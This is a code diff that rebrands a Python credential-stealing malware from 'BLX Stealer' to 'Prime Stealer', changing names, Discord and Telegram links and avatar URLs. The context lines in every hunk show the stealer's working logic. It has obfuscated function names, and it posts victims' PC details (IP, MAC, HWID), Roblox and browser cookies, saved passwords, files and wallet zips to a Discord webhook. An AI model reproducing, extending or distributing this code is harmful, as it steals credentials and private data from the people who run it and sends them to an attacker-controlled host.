@@ -896,7 +896,7 @@ def UP104D70K3N(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "BLX Stealer | discord.gg/blx",
+                "text": "Prime Stealer | discord.gg/Prime",
                 "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 },
             "thumbnail": {
@@ -904,8 +904,8 @@ def UP104D70K3N(token, path):
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
-        "username": "BLX Stealer | t.me/blxstealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+        "username": "Prime Stealer | t.me/Primestealer",
         "attachments": []
         }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -938,17 +938,17 @@ class PcInfo:
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | System Info",
+                    "title": "Prime Stealer | System Info",
                     "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer | discord.gg/blx",
+                        "text": "Prime Stealer | discord.gg/Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "username": "Prime Stealer | t.me/Primestealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1032,17 +1032,17 @@ data = {
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Roblox Information",
+                    "title": "Prime Stealer | Roblox Information",
                     "description": f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer | discord.gg/blx",
+                        "text": "Prime Stealer | discord.gg/Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "username": "Prime Stealer | t.me/Primestealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
 L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1070,17 +1070,17 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Cookies",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
+                    "title": "Prime Stealer | Cookies",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [PrimeCookies.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer | discord.gg/blx",
+                        "text": "Prime Stealer | discord.gg/Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "username": "Prime Stealer | t.me/Primestealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1096,17 +1096,17 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Passwords",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
+                    "title": "Prime Stealer | Passwords",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [PrimePasswords.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "BLX Stealer | discord.gg/blx",
+                        "text": "Prime Stealer | discord.gg/Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "username": "Prime Stealer | t.me/Primestealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1125,16 +1125,16 @@ def UP104D(name, link):
                     }
                 ],
                 "author": {
-                    "name": "BLX Stealer | Files"
+                    "name": "Prime Stealer | Files"
                 },
                 "footer": {
-                    "text": "BLX Stealer | discord.gg/blx",
+                    "text": "Prime Stealer | discord.gg/Prime",
                     "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "username": "Prime Stealer | t.me/Primestealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1143,7 +1143,7 @@ def UP104D(name, link):
 def wr173F0rF113(data, name):
     path = os.getenv("TEMP") + f"\lx{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--BLXStealer-->\n\n")
+        f.write(f"<--PrimeStealer-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1309,17 +1309,17 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": g108411NF0(),
         "embeds": [
             {
-            "title": "BLX Stealer | Zips",
+            "title": "Prime Stealer | Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": color,
             "footer": {
-                "text": "BLX Stealer | discord.gg/blx",
+                "text": "Prime Stealer | discord.gg/Prime",
                 "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
             }
             }
         ],
-        "username": "BLX Stealer | t.me/blxstealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+        "username": "Prime Stealer | t.me/Primestealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/Prime.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
         "attachments": []
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
